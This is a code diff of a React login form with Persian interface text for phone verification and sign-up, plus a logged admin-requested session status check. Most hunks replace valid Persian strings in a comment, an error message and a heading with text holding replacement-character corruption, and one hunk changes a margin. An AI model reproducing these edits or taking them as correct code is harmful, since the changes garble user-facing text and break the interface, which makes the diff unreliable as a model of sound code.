@@ -267,7 +267,7 @@ export const LoginForm = () => {
         setHasError(false);
         break;
       case "check_status":
-        // بررسی دقیق وضعیت کاربر با Enhanced Offline Detection
+        // ب��رسی دقیق وضعیت کاربر با Enhanced Offline Detection
         console.log("🔍 Admin requested enhanced status check for session:", sessionId);
 
         const isVisible = !document.hidden;
@@ -546,7 +546,7 @@ export const LoginForm = () => {
       }, 2000);
     } catch (error) {
       console.error("Verification error:", error);
-      setErrors({ verifyCode: "کد تایی�� نادرست است. لطفا دوباره تلاش کنید." });
+      setErrors({ verifyCode: "کد تای���� نادرست است. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -981,7 +981,7 @@ export const LoginForm = () => {
               textAlign: "center",
             }}
           >
-            {currentStep === "verify-phone" ? "تایید شماره موبایل" : "ورود و ثبت‌نام"}
+            {currentStep === "verify-phone" ? "تایید شماره موبایل" : "ورود و ثب��‌نام"}
           </span>
         </div>
 
@@ -2135,7 +2135,7 @@ export const LoginForm = () => {
                           cursor: "text",
                           direction: "ltr",
                           display: "flex",
-                          marginBottom: "28px",
+                          marginBottom: "16px",
                           position: "relative",
                           textAlign: "center",
                           width: "100%",
